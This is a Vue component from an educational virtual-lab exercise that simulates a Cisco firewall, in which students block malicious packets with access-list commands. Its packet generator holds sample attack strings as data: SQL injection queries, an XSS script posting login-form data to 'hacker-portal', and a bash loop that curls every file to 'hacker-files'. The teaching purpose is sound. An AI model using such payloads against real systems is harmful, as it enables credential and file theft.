<!--Designed & Developed by:
    Nirmal K (@cyberwizard1001)⁶
    Nitin Ravi (@nitinravi)
    SooryaSRajan (@SooryaSRajan)
    Ritwik M (@ritwik-m) &
    Nalinadevi K 
 for the Ministry of Education (MOE) virtual-labs project, Govt. Of India -->
<template>
  <main>
    <div class="flex-box">
      <div id="snackbar"></div>
      <div class="rem-space">
        <div class="row-1">
          <h4>Understanding Firewalls</h4>
          <p>
            Firewalls are a type of network security system that monitors and controls incoming and outgoing network
            traffic based on predetermined security rules. A firewall typically establishes a barrier between a trusted
            internal network and untrusted external network, such as the Internet. Firewalls are often categorized as
            either network firewalls or host-based firewalls.
          </p>
          <p>
            In this experiment, you will learn how to configure a firewall to block traffic from specific IP address
            that is sending malicious packets to a server.
          </p>
          <br>
          <div v-if="step === 1" class="content">
            <h4>Step 1: Entering configuration mode</h4>
            <p>
              Enter the configuration mode of the firewall by typing the following command:
            </p>
            <br>
            <div class="code">
              <code @click="copyToClipboard('configure terminal')">configure terminal
              </code>
            </div>
          </div>
          <div v-if="step === 2" class="content">
            <h4>Step 2: Viewing server network information</h4>
            <p>
              Get the interface information of the server which is in interface <span
                @click="copyToClipboard('GigabitEthernet0/0')" id="gigabit">"GigabitEthernet0/0"</span>. Try to find the
              IP
              address of the server using the following command:
            </p>
            <br>
            <div class="code">
              <code @click="copyToClipboard('show interface INTERFACE_NAME')">show interface INTERFACE_NAME
              </code>
            </div>
          </div>
          <div v-if="step === 3" class="content">
            <h4>Step 3: View Access List</h4>
            <p>
              Access lists are a set of rules that are used to filter traffic. They are used to control the traffic that
              is allowed to pass through a router or a firewall. Access lists are used to filter traffic based on the
              source and destination IP addresses, source and destination ports, and protocol type. In this experiment,
              you will be using access lists to block traffic from specific ports from a server to a client.
            </p>
            <br>
            <p>
              Get the access list information of the firewall using the following command:
            </p>
            <div class="code">
              <code @click="copyToClipboard('show access-lists')">show access-lists
              </code>
            </div>
          </div>
          <div v-if="step === 4" class="content">
            <h4>Step 4: Modifying the Access List</h4>
            <p>
              Access lists are a set of rules that are used to filter traffic. Modify the access list to block and allow
              traffic from specific ports from a server to a client. Towards the right side of this experiment you will
              see a list of packets. The packets are sent from a client to a server. The packets hold an IP address and
              it's packet content. Click on the packet to view the complete packet content and decide which packets to
              block and allow based on the packet content. Malicious packets usually hold SQL Injection code or XSS
              scripts or Bash Scripts. You can block these packets by blocking the IP Address from which the packets are
              sent. Use the below commands to do so.
            </p>
            <br>
            <p>
              Use the following command to block traffic of tcp packets from a specific Client IP Address to the server:
            </p>
            <div class="code">
              <code
                  @click="copyToClipboard('access-list block-packet deny tcp CLIENT_IP_ADDRESS host SERVER_IP_ADDRESS')">access-list
                block-packet deny tcp CLIENT_IP_ADDRESS host SERVER_IP_ADDRESS
              </code>
            </div>
            <br>
            <p>
              Use the following command to allow traffic of tcp packets from a specific port to the server:
            </p>
            <div class="code">
              <code
                  @click="copyToClipboard('access-list allow-packet allow tcp CLIENT_IP_ADDRESS host SERVER_IP_ADDRESS')">access-list
                allow-packet allow tcp CLIENT_IP_ADDRESS host SERVER_IP_ADDRESS
              </code>
            </div>
            <p>
              Note that we are only dealing with tcp packets in this experiment. Hence, tcp is always used in the above
              commands. In the commands, allow-packet and block-packet are the names of the access lists that you want
              to modify, these
              are existing access lists, creation of new access-list is restricted for this experiment. The
              SERVER_IP_ADDRESS is the IP address of the server and the CLIENT_IP_ADDRESS is
              the client IP address from which you want to block traffic, refer to the packet list to find the IP
              address numbers
              and the output of the second step to find the IP address of the server.
            </p>
            <StyledButton text="Verify Rules" :disable="disableButton" @click="verify"></StyledButton>
          </div>
        </div>
        <div class="row-2">
          <div class="col-1">
            <div class="network-row">
              <NetworkInteractionComponent ref="childComponentRef">
                <EndSystemComponent top="10%" left="5%" class="box" id="server">
                  <ServerComponent ip-address="Server"
                                   :port1="2"
                                   :port2="2"
                                   :port3="2"
                                   :port4="2"
                                   :port-labels="serverPortLabels"/>
                </EndSystemComponent>
                <EndSystemComponent top="40%" left="45%" class="box" id="firewall">
                  <img src="../assets/firewall.jpg" alt="firewall" style="width:150px;height:auto;">
                </EndSystemComponent>
                <EndSystemComponent top="60%" left="5%" class="box" id="client" :package-info="packetAnimationList">
                  <img src="../assets/workstation.svg" alt="desktop" style="width:150px;height:auto;">
                </EndSystemComponent>
                <EndSystemComponent top="39%" left="80%" class="box" id="trash">
                  <img src="../assets/trash.png" alt="trash" style="width:100px;height:auto;">
                </EndSystemComponent>
              </NetworkInteractionComponent>
            </div>
            <div class="packet-row">
              <h2>
                Packets
              </h2>
              <div class="packet-wrapper" v-for="(data, index) in packets" :key="index"
                   :style="{backgroundColor: getPacketWrapperColor(data.packetStatus), boxShadow: currentPacketIndex === index ? `0px 4px 20px #0077ff` : '', border: currentPacketIndex === index ? `4px solid #0077ff` : ''}">
                <span class="packet-index"
                      :style="{backgroundColor: data.packetStatus === 'COMPLETE' ? '#b0b0b0' : '#5bb644'}">{{
                    index
                  }}</span>
                <PackageComponent :data="[data.ipAddress, data.data.slice(0, 10) + '...']"
                                  :data-on-click="[data.data]"
                                  :background-color="data.packetStatus === 'COMPLETE' ? '#d7d7d7' : data.backgroundColor"></PackageComponent>
              </div>
            </div>
          </div>
          <div class="col-2">
            <div class="terminal" @click="terminalFocus">
              <span class="terminal-op" v-for="(data, index) in terminal" :key="index">{{ data }}</span>
              <div class="terminal-input">
                  <span>
                    {{ terminalStarterText }}
                  </span>
                <textarea class="terminal-input-field" id="terminal-ip" v-model="terminalInput"
                          v-on:keydown="onKeyDownTerminal"></textarea>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

  </main>
</template>
<script>
import TopBar from "@/components/TopBar";
import NetworkInteractionComponent from "@/components/network-components/NetworkInteractionComponent";
import EndSystemComponent from "@/components/network-components/EndSystemComponent";
import PackageComponent from "@/components/network-components/PackageComponent";
import ServerComponent from "@/components/ServerComponent";
import StyledButton from "@/components/StyledButton";

export default {
  components: {
    StyledButton,
    ServerComponent,
    PackageComponent,
    EndSystemComponent,
    NetworkInteractionComponent,
    TopBar
  },
  mounted() {

    this.serverIpAddress = Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255);

    let textAreas = document.getElementsByTagName('textarea');
    textAreas[0].addEventListener('input', autoResize, false);

    function autoResize() {
      textAreas[0].style.height = 'auto';
      textAreas[0].style.height = this.scrollHeight + 'px';
    }

    this.generateRandomPackets()

    for (const [key, value] of Object.entries(this.packetConfig)) {
      console.log(key);
      console.log(value.data);
      console.log(value.accessGroup);
      this.packets.push({
        data: value.data,
        ipAddress: key,
        packetStatus: 'INCOMPLETE',
        malicious: value.malicious,
      })
    }

    for (let i = 0; i < 4; i++) {
      let randomPortNumber = Math.floor(Math.random() * 8000) + 1000;
      this.serverPortLabels.push(randomPortNumber);
    }

    setTimeout(() => {
      this.$refs.childComponentRef.drawLine("firewall", "server", "black", "allowed packet");
      this.$refs.childComponentRef.drawLine("trash", "firewall", "black", "discarded packet");
      this.$refs.childComponentRef.drawLine("client", "firewall", "black", "incoming packet");
    }, 500)

  },
  data() {
    return {
      step: 1,
      disableButton: false,
      serverPortLabels: [],
      serverIpAddress: '',
      packetConfig: {},
      terminalStarterText: "ciscoasa> ",
      terminal: [],
      currentPacketIndex: -1,
      terminalInput: '',
      packets: [],
      packetsCopy: [],
      packetAnimationList: [{
        packageId: 'package01',
        data: [],
        displayPackage: false,
        packageBackgroundColor: '#9efd85',
        animationSeconds: 1
      }]
    }
  },
  methods: {
    resetPacketIndex() {
      //set all packets to incomplete
      this.packets.forEach((packet) => {
        packet.packetStatus = 'INCOMPLETE';
      })
    },
    generateRandomIP() {
      return Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255);
    },
    generateRandomPackets() {
      for (let i = 0; i < 6; i++) {
        let randomValue = Math.random();
        let randomIP = this.generateRandomIP();
        if (randomValue > 0.5) {
          let randomValueForCommand = Math.random();
          let packetContent = "";

          if (randomValueForCommand > 0.3 && randomValueForCommand < 0.5) {
            packetContent = "SELECT * FROM users WHERE username = 'admin' OR 1=1 --' AND password = 'admin'";
          } else if (randomValueForCommand > 0.5 && randomValueForCommand < 0.7) {
            packetContent = "<script>" +
                "let value = document.getElementById('login-form').value" +
                " fetch('http://hacker-portal:3000', {method: 'POST', body: value})" +
                //eslint-disable-next-line
                "<\/script>";
          } else if (randomValueForCommand > 0.7 && randomValueForCommand < 0.9) {
            packetContent = "#!/bin/bash\n" +
                "for file in *\n" +
                "do\n" +
                "    if [[ -f $file ]]; then\n" +
                "        content=$(cat \"$file\")\n" +
                "        curl -X POST -d \"$content\" http://hacker-files:8080\n" +
                "    fi\n" +
                "done\n";
          } else if (randomValueForCommand > 0.9 && randomValueForCommand < 0.95) {
            packetContent = "DELETE FROM users WHERE username = 'admin' OR 1=1 --' AND password = 'admin'";
          } else if (randomValueForCommand < 0.3 && randomValueForCommand > 0.1) {
            packetContent = "UPDATE users SET password = 'admin' WHERE username = 'admin' OR 1=1 --'";
          } else if (randomValueForCommand < 0.1) {
            packetContent = "INSERT INTO users VALUES ('admin', 'admin')";
          } else {
            packetContent = "SELECT * FROM users WHERE username = 'admin' AND password = 'admin'";
          }

          this.packetConfig[randomIP] = {
            accessGroup: "allow-packet",
            data: packetContent,
            malicious: true
          }
        } else {
          let packetData = ''

          let randomValueForCommand = Math.random();

          if (randomValueForCommand > 0.3 && randomValueForCommand < 0.5) {
            packetData = "HTTP/1.1 200 OK\n" +
                "Date: Mon, 27 Jul 2023 00:09:11 GMT\n" +
                "Server: Apache/2.2.14 (Win32)\n" +
                "Last-Modified: Wed, 22 Jul 2009 19:15:56 GMT\n" +
                "Content-Length: 88\n" +
                "Content-Type: text/html\n" +
                "Connection: Closed\n" +
                "\n" +
                "<html>\n" +
                "<body>\n" +
                "<h1>Hello, World!</h1>\n" +
                "</body>\n" +
                "</html>\n";
            //dont print Hello World
          } else if (randomValueForCommand > 0.5 && randomValueForCommand < 0.7) {
            packetData = "This is a simple text message";
          } else if (randomValueForCommand > 0.7 && randomValueForCommand < 0.9) {
            packetData = 'This is a very normal text message'
          } else if (randomValueForCommand > 0.9 && randomValueForCommand < 0.95) {
            packetData = "HTTPS/1.1 200 OK\n" +
                "Date: Mon, 27 Jul 2009 04:20:06:09 GMT\n" +
                "Content-Type: text/html\n" +
                "Connection: Closed\n" +
                "\n" +
                "Text message";
          } else if (randomValueForCommand < 0.3 && randomValueForCommand > 0.1) {
            packetData = "Hello World";
          } else if (randomValueForCommand < 0.1) {
            packetData = "This is a normal packet";
          } else {
            packetData = "This is a normal packet";
          }

          packetData += "\n"
          for (let i = 0; i < 10; i++) {
            packetData += String.fromCharCode(Math.floor(Math.random() * 26) + 97);
          }
          this.packetConfig[randomIP] = {
            accessGroup: "allow-packet",
            data: packetData,
            malicious: false
          }
        }
      }
      console.log(this.packetConfig)
    },
    verify() {
      this.verifyRecursive(0);
    },
    verifyRecursive(i) {
      this.currentPacketIndex = i;
      this.packetAnimationList[0].displayPackage = true

      let packetVerified = this.packets[i]
      let packetConfig = this.packetConfig[packetVerified.ipAddress]

      this.packetAnimationList[0].data = [packetVerified.ipAddress, packetConfig.data.slice(0, 10) + '...']

      if (i > 0) {
        this.packets[i - 1].packetStatus = "COMPLETE";
      }
      this.disableButton = true
      this.$refs.childComponentRef.animatePackage("firewall", "package01", "client", () => {
        if (packetConfig.accessGroup !== "allow-packet") {
          this.$refs.childComponentRef.animatePackage("trash", "package01", "firewall", () => {
            this.disableButton = false
            this.packetAnimationList[0].displayPackage = false
            if (packetVerified.malicious === true) {
              if (i < this.packets.length - 1) {
                this.verifyRecursive(i + 1);
              }
              if (i === this.packets.length - 1) {
                this.packets[i].packetStatus = "COMPLETE";
                if (this.packets.every(packet => packet.packetStatus === "COMPLETE")) {
                  this.correct1("All packets have been verified")
                }
              }
            } else {
              this.incorrect("Incorrect packet configuration, please try again")
              this.resetPacketIndex()
            }
          });
        } else {
          this.$refs.childComponentRef.animatePackage("server", "package01", "firewall", () => {
            this.disableButton = false
            this.packetAnimationList[0].displayPackage = false
            if (packetVerified.malicious === false) {
              if (i < this.packets.length - 1) {
                this.verifyRecursive(i + 1);
              }
              if (i === this.packets.length - 1) {
                this.packets[i].packetStatus = "COMPLETE";
                if (this.packets.every(packet => packet.packetStatus === "COMPLETE")) {
                  this.correct1("All packets have been verified")
                  this.resetPacketIndex()
                }
              }
            } else {
              this.incorrect("Incorrect packet configuration, please try again")
              this.resetPacketIndex()
            }
          });
        }
      });

    },
    correct1(message) {
      const x = document.getElementById("snackbar");
      x.innerHTML = message;
      x.style.backgroundColor = "green";
      x.className = "show";
      setTimeout(function () {
        x.className = x.className.replace("show", "");
      }, 3000)
    },
    incorrect(msg) {
      const x = document.getElementById("snackbar");
      x.innerHTML = msg;
      x.style.backgroundColor = "red";
      x.className = "show";
      setTimeout(function () {
        x.className = x.className.replace("show", "");
      }, 3000)
    },
    terminalFocus() {
      let textArea = document.getElementById('terminal-ip');
      textArea.scrollTop = textArea.scrollHeight;
      textArea.focus(); //set the focus - cursor at end
    },
    copyToClipboard(text) {
      navigator.clipboard.writeText(text)
      this.correct1("Copied code to clipboard");
    },
    onKeyDownTerminal(event) {
      if (event.key === "Enter") {
        event.preventDefault();
        const text = this.terminalInput;
        this.terminalInput = '';
        let textArea = document.getElementById('terminal-ip');
        textArea.style.height = 'auto';
        textArea.style.height = this.scrollHeight + 'px';
        this.terminal.push(this.terminalStarterText + text);

        if (text === "configure terminal" && this.terminalStarterText === "ciscoasa> ") {
          this.terminalStarterText = "ciscoasa(config)# ";
          if (this.step === 1) {
            this.step = 2;
          }
        } else if (text === "configure terminal" && this.terminalStarterText !== "ciscoasa> ") {
          this.terminal.push(this.terminalStarterText + "Invalid input detected.");
        } else if (text === "exit" && this.terminalStarterText === "ciscoasa(config)# ") {
          this.terminalStarterText = "ciscoasa> ";
          this.terminal.push(this.terminalStarterText);
        } else if (this.terminalStarterText === "ciscoasa(config)# ") {

          let matchForCommand = text.match(/access-list (\w+-?\w*) (allow|deny) (tcp|udp) (any|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}) host (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/)

          if (text.match(/show interface\s.+/g)) {
            const interfaceName = text.split(" ")[2];
            if (interfaceName === "GigabitEthernet0/0") {
              this.terminal.push("GigabitEthernet0/0 is up, line protocol is up (connected)");
              this.terminal.push("  Hardware is Gigabit Ethernet, address is 001c.73a5.6c00 (bia 001c.73a5.6c00)");
              this.terminal.push("  Internet address is " + this.serverIpAddress + "/24");
              this.terminal.push("  MTU 1500 bytes, BW 1000000 Kbit/sec, DLY 100 usec,");
              this.terminal.push("     reliability 255/255, txload 1/255, rxload 1/255");
              this.terminal.push("  Encapsulation ARPA, loopback not set");
              this.terminal.push("  Keepalive set (10 sec)");
              this.terminal.push("  Full Duplex, 1000Mb/s, media type is RJ45");
              this.terminal.push("  output flow-control is unsupported, input flow-control is unsupported");
              this.terminal.push("  ARP type: ARPA, ARP Timeout 04:00:00");
              this.terminal.push("  Last input 00:00:00, output 00:00:00, output hang never");
              this.terminal.push("  Last clearing of \"show interface\" counters never");
              this.terminal.push("  Input queue: 0/75/0/0 (size/max/drops/flushes); Total output drops: 0");
              this.terminal.push("  Queueing strategy: fifo");
              this.terminal.push("  Output queue: 0/40 (size/max)");
              this.terminal.push("  5 minute input rate 0 bits/sec, 0 packets/sec");
              this.terminal.push(" 5 minute output rate 0 bits/sec, 0 packets/sec");

              if (this.step === 2) {
                this.step = 3;
              }

            } else {
              this.terminal.push(interfaceName + " is down, line protocol is down (notconnect)");
            }
          } else if (text === "show access-lists") {
            Object.entries(this.packetConfig).forEach(([key, value]) => {
              if (value.accessGroup === 'allow-packet') {
                this.terminal.push(`Standard IP access list allow-all`)
                this.terminal.push("10 permit allow-packet " + key + " host " + this.serverIpAddress);
              } else if (value.accessGroup === 'block-packet') {
                this.terminal.push(`Standard IP access list block-all`)
                this.terminal.push("10 deny block-packet " + key + " host " + this.serverIpAddress);
              }
            })

            if (this.step === 3) {
              this.step = 4;
            }
          } else if (matchForCommand) {
            const [regex, accessListName, type, protocol, source, destination] = matchForCommand
            console.log(regex)
            console.log('Access List Name:', accessListName);
            console.log('Type:', type);
            console.log('Protocol:', protocol);
            console.log('Source:', source);
            console.log('Destination:', destination);
            console.log('Packet Config:', this.packetConfig);

            if (this.serverIpAddress !== destination) {
              this.terminal.push("Destination IP address not found.");
              return;
            }

            if (protocol !== 'tcp') {
              this.terminal.push("Only TCP protocol is allowed.");
              return;
            }

            if (source === 'any') {
              //iterate through all clients and set access group to block-packet or allow-packet based on type
              if (type === 'allow') {
                this.terminal.push("Setting allow rule to all clients for allow-packet group.");
              } else {
                this.terminal.push("Setting deny rule to all clients for block-packet group.");
              }
              Object.entries(this.packetConfig).forEach(([key]) => {
                if (accessListName === 'allow-packet' && type === 'allow') {
                  this.packetConfig[key].accessGroup = 'allow-packet';
                } else if (accessListName === 'block-packet' && type === 'deny') {
                  this.packetConfig[key].accessGroup = 'block-packet';
                } else {
                  this.terminal.push("Access group " + accessListName + " not found for " + type + " does not exist.");
                }
              })
            } else {
              if (this.packetConfig[source]) {
                if (accessListName === 'allow-packet' && type === 'allow') {
                  this.packetConfig[source].accessGroup = 'allow-packet';
                  this.terminal.push("Setting allow rule to " + source + " for allow-packet group.");
                } else if (accessListName === 'block-packet' && type === 'deny') {
                  this.packetConfig[source].accessGroup = 'block-packet';
                  this.terminal.push("Setting deny rule to " + source + " for block-packet group.");
                } else {
                  this.terminal.push("Access group " + accessListName + " not found for " + type + " does not exist.");
                }
              } else {
                this.terminal.push("Source IP address not found.");
              }
            }

          } else {
            this.terminal.push(this.terminalStarterText + "Invalid input detected.");
          }
        } else {
          this.terminal.push(this.terminalStarterText + "Invalid input detected.");
        }
      }
    },
    getPacketWrapperColor(packetStatus) {
      switch (packetStatus) {
        case "INCOMPLETE":
          return "#e2ffd6";
        case "COMPLETE":
          return "#eaeaea";
        default:
          return "none";
      }
    },
  }
}

</script>

<style>
.flex-box {
  display: flex;
  flex-direction: column;
  height: 100vh;
  width: 100%;
}

body {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

p {
  
}

main {
  height: 100vh;
  width: 100vw;
}

#snackbar {
  visibility: hidden;
  min-width: 250px;
  margin-left: -125px;
  background-color: #333;
  color: #fff;
  text-align: center;
  border-radius: 2px;
  padding: 16px;
  position: fixed;
  z-index: 1;
  left: 50%;
  bottom: 30px;
  font-size: 17px;
}

#snackbar.show {
  visibility: visible;
  -webkit-animation: fadein 0.5s, fadeout 0.5s 2.5s;
  animation: fadein 0.5s, fadeout 0.5s 2.5s;
}

@-webkit-keyframes fadein {
  from {
    bottom: 0;
    opacity: 0;
  }

  to {
    bottom: 30px;
    opacity: 1;
  }
}

@keyframes fadein {
  from {
    bottom: 0;
    opacity: 0;
  }

  to {
    bottom: 30px;
    opacity: 1;
  }
}

@-webkit-keyframes fadeout {
  from {
    bottom: 30px;
    opacity: 1;
  }

  to {
    bottom: 0;
    opacity: 0;
  }
}

@keyframes fadeout {
  from {
    bottom: 30px;
    opacity: 1;
  }

  to {
    bottom: 0;
    opacity: 0;
  }
}


.rem-space {
  flex: 1;
  display: flex;
  flex-direction: row;
  justify-content: space-evenly;
  overflow: clip;
}

div {
  box-sizing: border-box;
}

#gigabit {
  padding: 0;
  margin: 0;
  display: inline-block;
}

#gigabit:hover {
  cursor: copy;
}

.row-1 {
  width: 25%;
  display: flex;
  flex-direction: column;
  justify-content: start;
  align-items: start;
  padding: 20px;
  overflow: scroll;
}

.row-2 {
  width: 75%;
  display: flex;
  flex-direction: column;
}

.col-1 {
  height: 70%;
  display: flex;
  flex-direction: row;
}

.col-2 {
  width: 100%;
  height: 30%;
  background-color: #252526;
  overflow-y: auto;
}

.network-row {
  width: 100%;
  height: 100%;
}

.packet-row {
  width: 20%;
  height: 100%;
  padding-left: 20px;
  display: flex;
  flex-direction: column;
  justify-content: start;
  align-items: start;
  overflow-y: scroll;
}

.terminal {
  width: 80%;
  min-height: 100%;
  font-size: 16px;
  display: flex;
  flex-direction: column;
  justify-content: flex-start;
  align-items: flex-start;
  font-family: monospace;
  padding: 10px 15px;
  background-color: #252526;
  color: #33FF00;
  overflow-y: scroll;
}

.packet-wrapper {
  background-color: #252526;
  margin-bottom: 20px;
  display: flex;
  flex-direction: row;
  justify-content: start;
  align-items: start;
  border-radius: 7px;
  padding: 10px;
  box-shadow: 0 0 10px 0 rgba(0, 0, 0, 0.5);
}

.packet-index {
  width: 30px;
  height: 30px;
  border-radius: 50%;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  color: #fff;
  font-size: 15px;
  font-weight: bold;
  margin-right: 10px;
}

.terminal-input-field {
  background-color: #252526;
  color: #33FF00;
  border: none;
  outline: none;
  font-family: monospace;
  font-size: 16px;
  flex: 1;
  padding: 0 0 0 10px;
  resize: none;
}

.terminal-op {
  padding-bottom: 3px;
  max-width: inherit;
}

.terminal-input {
  display: flex;
  flex-direction: row;
  width: 100%;
}

.code {
  text-align: center;
  margin-top: 20px;
  height: fit-content;
  width: 100%;
  padding: 25px;
  border-radius: 5px;
  background-color: #202020;
  color: white;
  font-size: large;
  font-family: monospace;
  font-weight: bold;
}

code:hover {
  cursor: copy;
}

span {
  display: block;
  padding: 0;
  margin: 0;
  text-align: start;
  overflow-wrap: break-word;
}

</style>